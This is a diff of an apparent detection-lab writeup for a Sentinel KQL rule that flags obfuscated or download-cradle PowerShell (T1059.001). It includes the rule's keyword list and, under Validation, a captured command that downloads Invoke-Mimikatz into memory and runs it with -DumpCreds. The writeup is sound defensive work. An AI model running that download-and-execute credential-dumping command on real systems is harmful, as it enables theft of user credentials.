@@ -42,8 +42,7 @@ Event
 | where Source == "Microsoft-Windows-Sysmon"
 | where EventID == 1
 | where EventData has "powershell"
-| where EventData has_any ("-enc", "-EncodedCommand", "FromBase64String",
-                           "DownloadString", "IEX", "hidden", "-nop", "-NoProfile")
+| where EventData has_any ("-enc", "-EncodedCommand", "FromBase64String", "DownloadString", "IEX", "-nop", "-NoProfile")
 | project TimeGenerated, Computer, RenderedDescription
 | sort by TimeGenerated desc
 ```
@@ -61,14 +60,13 @@ Event
 | Incident creation | Enabled |
 | MITRE mapping | Execution / T1059.001 |
 
-This rule was initially configured with a 5-minute lookback, which caused missed events due to ingestion latency. Updating to a 1-hour lookback with suppression enabled fixed that issue and became the standard tuning pattern for later detections. For the rationale, see the
-[T1059.003 writeup](https://github.com/alexcolincrawford/mitre-attack-sentinel-detection-lab/blob/main/detections/T1059.003-windows-command-shell/writeup.md).
+This rule was initially configured with a 5-minute lookback, which caused missed events due to ingestion latency. Updating to a 1-hour lookback with suppression enabled fixed that issue and became the standard tuning pattern for later detections. For the rationale, see the [T1059.003 writeup](https://github.com/alexcolincrawford/mitre-attack-sentinel-detection-lab/blob/main/detections/T1059.003-windows-command-shell/writeup.md).
 
 ## Validation
 
 The analytics rule fired and raised a live incident in the Microsoft Defender portal, correctly attributed to `CLIENT01.lab.local` and grouped into 19 related events.
 
-Inspecting the captured event showed a download-and-execute cradle for **Mimikatz**, pulled into memory and run with `-DumpCreds`.
+Inspecting the captured event showed a download-and-execute cradle for **Mimikatz**, downloaded and executed in memory with `-DumpCreds`.
 
 The captured command line was:
 
@@ -76,7 +74,7 @@ The captured command line was:
 cmd.exe /c powershell.exe "IEX (New-Object Net.WebClient).DownloadString('.../PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 ```
 
-This validates the pipeline end to end: the attack was emulated on the endpoint, captured by Sysmon, forwarded through the AMA/DCR pipeline, matched by the KQL rule, and surfaced as an incident mapped to T1059.001.
+The attack was emulated on the endpoint, captured by Sysmon, forwarded through the AMA/DCR pipeline, matched by the KQL rule, and surfaced as an incident mapped to T1059.001.
 
 ## False-positive considerations
 
